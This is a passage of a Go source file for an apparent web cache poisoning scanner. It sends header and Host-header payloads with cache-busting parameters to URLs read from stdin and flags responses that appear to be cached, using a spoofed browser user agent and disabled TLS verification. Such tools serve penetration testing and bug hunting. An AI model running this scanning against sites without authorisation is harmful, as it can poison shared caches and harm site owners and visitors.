		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
	}

	// Make initial request
	printProgress("%s", targetURL)
	len1, resp1, err := makeRequest(client, targetURL)
	clearLine()

	if err != nil {
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
			checkDomainTimeout(targetURL, true)
		} else if strings.Contains(err.Error(), "no such host") ||
			strings.Contains(err.Error(), "server closed connection") ||
			strings.Contains(err.Error(), "connection refused") {
			if *verbose {
				printError("Connection error for %s: %v", targetURL, err)
			}
			skippedURLs.Store(targetURL, SkipConnectionError)
			return
		}
		if *verbose {
			printError("Error making initial request to %s: %v", targetURL, err)
		}
		return
	}

	if resp1 != nil {
		defer fasthttp.ReleaseResponse(resp1)
		if !hasCacheHeaders(resp1) {
			if *verbose {
				printVerbose("No cache headers found for %s, skipping", targetURL)
			}
			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
			return
		}
	}

	// Create URL with random query parameter
	u, err = url.Parse(targetURL)
	if err != nil {
		if *verbose {
			printError("Error parsing URL %s: %v", targetURL, err)
		}
		return
	}

	// Add random query parameter
	q := u.Query()
	q.Set("zzz", randString(8))
	u.RawQuery = q.Encode()
	randomURL := u.String()

	// Make request with random query parameter
	printProgress("%s", randomURL)
	len2, resp2, err := makeRequest(client, randomURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making random query request to %s: %v", randomURL, err)
		}
		return
	}

	if resp2 != nil {
		defer fasthttp.ReleaseResponse(resp2)
	}

	// If lengths are different, skip (allowing 30 chars difference)
	if abs(len1-len2) > 30 {
		if *verbose {
			printVerbose("Random query parameter caused size change for %s, skipping", targetURL)
		}
		return
	}

	// Parse header payload
	headerParts := strings.SplitN(headerPayload, ": ", 2)
	if len(headerParts) != 2 {
		if *verbose {
			printError("Invalid header payload format: %s", headerPayload)
		}
		return
	}
	headerName := headerParts[0]
	headerValue := headerParts[1]

	// Create new request with header
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	// Add new random query parameter
	q.Set("zzz", randString(8))
	u.RawQuery = q.Encode()
	headerURL := u.String()

	req.SetRequestURI(headerURL)
	req.Header.SetMethod("GET")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("Accept-Encoding", "")
	req.Header.Set("Sec-Ch-Ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"")
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", "\"macOS\"")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set(headerName, headerValue)

	// Make request with header
	printProgress("%s", headerURL)
	resp3 := fasthttp.AcquireResponse()
	err = client.Do(req, resp3)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making header request to %s: %v", headerURL, err)
		}
		fasthttp.ReleaseResponse(resp3)
		return
	}

	len3 := int64(resp3.Header.ContentLength())
	if len3 <= 0 {
		len3 = int64(len(resp3.Body()))
	}
	fasthttp.ReleaseResponse(resp3)

	// If lengths are similar, skip
	if len1 == len3 {
		if *verbose {
			printVerbose("Header did not cause size change for %s, skipping", targetURL)
		}
		return
	}

	// Make request with same query parameter
	printProgress("%s", headerURL)
	len4, resp4, err := makeRequest(client, headerURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making verification request to %s: %v", headerURL, err)
		}
		return
	}

	if resp4 != nil {
		defer fasthttp.ReleaseResponse(resp4)
	}

	// If lengths are similar to the header request, we found something
	if len3 == len4 {
		printResult("Header potential at %s with header '%s' - original_len=%d random_len=%d header_len=%d verify_len=%d",
			targetURL, truncatePayload(headerPayload), len1, len2, len3, len4)
		skippedURLs.Store(targetURL, SkipFoundIssue)
	}
}

func processHostHeader(client *fasthttp.Client, targetURL, hostPayload string) {
	if reason, found := skippedURLs.Load(targetURL); found {
		if *verbose {
			printVerbose("Skipping %s: %s", targetURL, reason)
		}
		return
	}

	domain := extractDomain(targetURL)
	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
		if *verbose {
			printVerbose("Skipping %s due to too many errors on domain", targetURL)
		}
		return
	}

	// Add trailing slash if URL ends at domain level
	var err error
	var u *url.URL
	u, err = url.Parse(targetURL)
	if err == nil && (u.Path == "" || u.Path == "/") {
		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
	}

	// Make initial request
	printProgress("%s", targetURL)
	len1, resp1, err := makeRequest(client, targetURL)
	clearLine()

	if err != nil {
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
			checkDomainTimeout(targetURL, true)
		} else if strings.Contains(err.Error(), "no such host") ||
			strings.Contains(err.Error(), "server closed connection") ||
			strings.Contains(err.Error(), "connection refused") {
			if *verbose {
				printError("Connection error for %s: %v", targetURL, err)
			}
			skippedURLs.Store(targetURL, SkipConnectionError)
			return
		}
		if *verbose {
			printError("Error making initial request to %s: %v", targetURL, err)
		}
		return
	}

	if resp1 != nil {
		defer fasthttp.ReleaseResponse(resp1)
		if !hasCacheHeaders(resp1) {
			if *verbose {
				printVerbose("No cache headers found for %s, skipping", targetURL)
			}
			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
			return
		}
	}

	// Create URL with random query parameter
	u, err = url.Parse(targetURL)
	if err != nil {
		if *verbose {
			printError("Error parsing URL %s: %v", targetURL, err)
		}
		return
	}

	// Add random query parameter
	q := u.Query()
	q.Set("zzz", randString(8))
	u.RawQuery = q.Encode()
	randomURL := u.String()

	// Make request with random query parameter
	printProgress("%s", randomURL)
	len2, resp2, err := makeRequest(client, randomURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making random query request to %s: %v", randomURL, err)
		}
		return
	}

	if resp2 != nil {
		defer fasthttp.ReleaseResponse(resp2)
	}

	// If lengths are different, skip (allowing 30 chars difference)
	if abs(len1-len2) > 30 {
		if *verbose {
			printVerbose("Random query parameter caused size change for %s, skipping", targetURL)
		}
		return
	}

	// Create new request with modified host header
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	// Add new random query parameter
	q.Set("zzz", randString(8))
	u.RawQuery = q.Encode()
	hostURL := u.String()

	// Make request with modified host header using makeDirectRequest
	printProgress("%s", hostURL)
	len3, resp3, err := makeDirectRequest(hostURL, hostPayload)
	if resp3 != nil {
		defer fasthttp.ReleaseResponse(resp3)
	}
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making host header request to %s: %v", hostURL, err)
		}
		return
	}

	// Get required difference based on response size
	requiredDiff := getRequiredDifference(len2)

	// If size didn't change with host header, skip
	if abs(len2-len3) <= requiredDiff {
		if *verbose {
			printVerbose("Host header did not cause size change for %s, skipping", targetURL)
		}
		return
	}

	// Make request with same query parameter
	printProgress("%s", hostURL)
	len4, resp4, err := makeRequest(client, hostURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making verification request to %s: %v", hostURL, err)
		}
		return
	}

	if resp4 != nil {
		defer fasthttp.ReleaseResponse(resp4)
	}

	// If lengths are similar to the host header request, we found something
	if abs(len3-len4) <= 30 {
		printResult("Host header potential at %s with payload '%s' - original_len=%d random_len=%d host_len=%d verify_len=%d (required diff: %d)",
			targetURL, truncatePayload(hostPayload), len1, len2, len3, len4, requiredDiff)
		skippedURLs.Store(targetURL, SkipFoundIssue)
	}
}

func main() {
	useProxy = flag.Bool("proxy", false, "Use local proxy (127.0.0.1:8080)")
	verbose = flag.Bool("v", false, "Show errors only")
	veryVerbose = flag.Bool("vv", false, "Show all logging (current verbose)")
	domainWorkers = flag.Int("t", 10, "Number of concurrent domain workers")
	showStats = flag.Bool("s", false, "Show statistics at the end")
	normalFlow = flag.Bool("P", false, "Use path testing flow")
	delimiterFlow = flag.Bool("D", false, "Use delimiter testing flow")
	headerFlow = flag.Bool("H", false, "Use header testing flow")
	hostHeaderFlow = flag.Bool("HH", false, "Use host header testing flow")
	flag.Parse()

	if !*normalFlow && !*delimiterFlow && !*headerFlow && !*hostHeaderFlow {
		fmt.Println("Error: Must specify at least one flow with -P, -D, or -H flag")
		os.Exit(1)
	}

	if *veryVerbose {
		*verbose = true
	}

	client := &fasthttp.Client{
		DisablePathNormalizing:   true,
		NoDefaultUserAgentHeader: true,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
		},
		ReadTimeout:         10 * time.Second,
		WriteTimeout:        10 * time.Second,
		MaxIdleConnDuration: 10 * time.Second,
		MaxConnDuration:     30 * time.Second,
		MaxConnsPerHost:     20,
		MaxConnWaitTimeout:  10 * time.Second,
		ReadBufferSize:      128 * 1024,
		WriteBufferSize:     16 * 1024,
		MaxResponseBodySize: 10 * 1024 * 1024, // 10MB max response size
		RetryIf: func(req *fasthttp.Request) bool {
			return false // Disable retries
		},
		DialDualStack: false,
		Dial: func(addr string) (net.Conn, error) {
			host, port, err := net.SplitHostPort(addr)
			if err != nil {
				return nil, err
			}

			ips, err := net.LookupIP(host)
			if err != nil {
				return nil, err
			}

			var ipv4 net.IP
			for _, ip := range ips {
				if ip.To4() != nil {
					ipv4 = ip
					break
				}
			}

			if ipv4 == nil {
				return nil, fmt.Errorf("no IPv4 address found for %s", host)
			}

			dialer := &net.Dialer{
				Timeout:   5 * time.Second, // Reduced from 10s
				KeepAlive: 30 * time.Second,
				DualStack: false,
			}

			conn, err := dialer.Dial("tcp4", net.JoinHostPort(ipv4.String(), port))
			if err != nil {
				return nil, err
			}

			tcpConn := conn.(*net.TCPConn)
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
			tcpConn.SetNoDelay(true)
			tcpConn.SetReadBuffer(128 * 1024)
			tcpConn.SetWriteBuffer(16 * 1024)

			// Set read/write deadlines
			tcpConn.SetDeadline(time.Now().Add(10 * time.Second))

			return conn, nil
		},
		MaxIdemponentCallAttempts:     1,
		DisableHeaderNamesNormalizing: true,
		StreamResponseBody:            false,
	}

	if *useProxy {
		client.Dial = func(addr string) (net.Conn, error) {
			proxyConn, err := net.Dial("tcp", "127.0.0.1:8080")
			if err != nil {
				printError("Proxy connection error: %v", err)
				return nil, err
			}

			host := addr
			fmt.Fprintf(proxyConn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, host)

			br := bufio.NewReader(proxyConn)
			res, err := http.ReadResponse(br, &http.Request{Method: "CONNECT"})
			if err != nil {
				proxyConn.Close()
				printError("Proxy response error: %v", err)
				return nil, err
			}
			if res.StatusCode != 200 {
				proxyConn.Close()
				printError("Proxy error: %s", res.Status)
				return nil, fmt.Errorf("proxy error: %s", res.Status)
			}

			if strings.HasSuffix(addr, ":443") {
				tlsConn := tls.Client(proxyConn, &tls.Config{
					ServerName:         strings.Split(addr, ":")[0],
					InsecureSkipVerify: true,
				})
				if err := tlsConn.Handshake(); err != nil {
					proxyConn.Close()
					printError("TLS handshake error: %v", err)
					return nil, err
				}
				return tlsConn, nil
			}

			return proxyConn, nil
		}
	}

	cleanup := time.NewTicker(60 * time.Second)
	defer cleanup.Stop()
	go func() {
		for range cleanup.C {
			client.CloseIdleConnections()
		}
	}()

	printEssential("Reading URLs from stdin...")
	var allURLs []string
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		urlStr := strings.TrimSpace(scanner.Text())
		if urlStr == "" {
			continue
		}
		if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
			if *verbose {
				printError("Invalid URL (missing scheme): %s", urlStr)
			}
			continue
		}
		allURLs = append(allURLs, urlStr)
	}
	if err := scanner.Err(); err != nil {
		printError("Error reading input: %v", err)
		os.Exit(1)
	}
	printEssential("Found %d URLs, starting tests...", len(allURLs))

	domainURLs := make(map[string][]string)
	for _, urlStr := range allURLs {
		domain := extractDomain(urlStr)
		topDomain := extractTopLevelDomain(domain)
		domainURLs[topDomain] = append(domainURLs[topDomain], urlStr)
	}

	initStats()

	if *normalFlow {
		printEssential("Starting normal flow...")
		for i, payload := range payloads {
			printEssential("Testing payload %d of %d: '%s'", i+1, len(payloads), truncatePayload(payload))
			runFlow(client, domainURLs, payload, false)
		}
	}

	if *delimiterFlow {
		printEssential("Starting delimiter flow...")
		for i, payload := range delimiterPayloads {
			printEssential("Testing delimiter payload %d of %d: '%s'", i+1, len(delimiterPayloads), truncatePayload(payload))
			runFlow(client, domainURLs, payload, true)
		}
	}

	if *headerFlow {
		printEssential("Starting header testing flow...")
		for i, payload := range headerPayloads {
			printEssential("Testing header payload %d of %d: '%s'", i+1, len(headerPayloads), truncatePayload(payload))
			runHeaderFlow(client, domainURLs, payload)
		}
	}

	if *hostHeaderFlow {
		printEssential("Starting host header testing flow...")
		for i, payload := range hostHeaderPayloads {
			printEssential("Testing host header payload %d of %d: '%s'", i+1, len(hostHeaderPayloads), truncatePayload(payload))
			runHostHeaderFlow(client, domainURLs, payload)
		}
	}

	if *showStats {
		printStats()
	}

	client.CloseIdleConnections()
}

func runFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string, isDirectoryFlow bool) {
	var domainWg sync.WaitGroup
	domainSem := make(chan struct{}, *domainWorkers)

	for domain, urls := range domainURLs {
		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
			if *verbose {
				printVerbose("Skipping domain %s due to too many timeouts", domain)
			}
			continue
		}

		if isDomainBlacklisted(domain) {
			continue
		}

		domainSem <- struct{}{} // Acquire semaphore
		domainWg.Add(1)
		go func(domain string, urls []string) {
			defer func() {
				<-domainSem // Release semaphore
				domainWg.Done()
			}()

			urlChan := make(chan string, len(urls))
			var wg sync.WaitGroup

			// Scale workers based on URL count
			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
			if domainWorkers > 15 {
				domainWorkers = 15 // Cap at 15
			}

			for i := 0; i < domainWorkers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for targetURL := range urlChan {
						if _, found := skippedURLs.Load(targetURL); found {
							continue
						}

						if isDirectoryFlow {
							processDelimiter(client, targetURL, payload)
						} else {
							processURL(client, targetURL, payload)
						}

						time.Sleep(25 * time.Millisecond)
					}
				}()
			}

			go func() {
				for _, url := range urls {
					urlChan <- url
				}
				close(urlChan)
			}()

			wg.Wait()
		}(domain, urls)
	}

	domainWg.Wait()
	time.Sleep(50 * time.Millisecond)
}

func runHeaderFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string) {
	var domainWg sync.WaitGroup
	domainSem := make(chan struct{}, *domainWorkers)

	for domain, urls := range domainURLs {
		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
			if *verbose {
				printVerbose("Skipping domain %s due to too many timeouts", domain)
			}
			continue
		}

		if isDomainBlacklisted(domain) {
			continue
		}

		domainSem <- struct{}{} // Acquire semaphore
		domainWg.Add(1)
		go func(domain string, urls []string) {
			defer func() {
				<-domainSem // Release semaphore
				domainWg.Done()
			}()

			urlChan := make(chan string, len(urls))
			var wg sync.WaitGroup

			// Scale workers based on URL count
			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
			if domainWorkers > 15 {
				domainWorkers = 15 // Cap at 15
			}

			for i := 0; i < domainWorkers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for targetURL := range urlChan {
						if _, found := skippedURLs.Load(targetURL); found {
							continue
						}

						processHeader(client, targetURL, payload)
						time.Sleep(25 * time.Millisecond)
					}
				}()
			}

			go func() {
				for _, url := range urls {
					urlChan <- url
				}
				close(urlChan)
			}()

			wg.Wait()
		}(domain, urls)
	}

	domainWg.Wait()
	time.Sleep(50 * time.Millisecond)
}

func runHostHeaderFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string) {
	var domainWg sync.WaitGroup
	domainSem := make(chan struct{}, *domainWorkers)

	for domain, urls := range domainURLs {
		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
			if *verbose {
				printVerbose("Skipping domain %s due to too many timeouts", domain)
			}
			continue
		}

		if isDomainBlacklisted(domain) {
			continue
		}

		domainSem <- struct{}{} // Acquire semaphore
		domainWg.Add(1)
		go func(domain string, urls []string) {
			defer func() {
				<-domainSem // Release semaphore
				domainWg.Done()
			}()

			urlChan := make(chan string, len(urls))
			var wg sync.WaitGroup

			// Scale workers based on URL count
			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
			if domainWorkers > 15 {
				domainWorkers = 15 // Cap at 15
			}

			for i := 0; i < domainWorkers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for targetURL := range urlChan {
						if _, found := skippedURLs.Load(targetURL); found {
							continue
						}

						processHostHeader(client, targetURL, payload)
						time.Sleep(25 * time.Millisecond)
					}
				}()
			}

			go func() {
				for _, url := range urls {
					urlChan <- url
				}
				close(urlChan)
			}()

			wg.Wait()
		}(domain, urls)
	}

	domainWg.Wait()
	time.Sleep(50 * time.Millisecond)
}
